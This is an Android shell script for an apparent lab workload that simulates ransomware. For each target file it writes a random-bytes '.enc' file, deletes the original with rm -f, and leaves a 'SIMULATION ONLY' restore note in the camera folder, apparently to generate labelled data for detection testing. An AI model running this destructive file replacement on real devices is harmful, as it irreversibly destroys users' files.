#!/system/bin/sh
# A2: Write file.enc with random bytes of same size, then delete original
DIR="$(cd "$(dirname "$0")" && pwd)"
WORKLOAD_NAME="A2"
WORKLOAD_LABEL="attack"
. "$DIR/lib.sh"

MAX_FILES="${MAX_FILES:-40}"
DELAY="${DELAY:-0.05}"

verify_lab_env
log_truth "start"

OLD_IFS="$IFS"
IFS='
'
for f in $(list_attack_targets "$MAX_FILES"); do
    IFS="$OLD_IFS"
    if [ ! -f "$f" ]; then
        log_truth "skip" "$f"
        continue
    fi
    sz="$(file_size "$f")"
    enc="${f}.enc"
    head -c "$sz" /dev/urandom > "$enc"
    log_truth "create" "$enc"
    rm -f "$f"
    log_truth "delete" "$f"
    sleep "$DELAY"
done
IFS="$OLD_IFS"

note="$TARGET_ROOT/DCIM/Camera/README_RESTORE.txt"
printf 'SIMULATION ONLY: Your files were encrypted in lab trial %s.\n' "$RUN_ID" > "$note"
log_truth "create" "$note"

log_truth "end"